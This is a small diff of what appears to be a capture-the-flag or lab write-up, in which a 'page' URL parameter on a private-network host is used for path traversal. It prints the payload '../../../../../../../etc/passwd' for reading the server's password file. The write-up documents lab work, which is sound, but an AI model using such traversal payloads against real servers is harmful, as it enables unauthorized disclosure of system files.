@@ -7,6 +7,7 @@ Everytime change page, we can see url param `page` is changed.
 http://192.168.122.158/?page=some_page
 ```
 We can exploit this breach for browsing server side file, expecially /etc/passwd
+
 ```
 /index.php?page=../../../../../../../etc/passwd
 ```
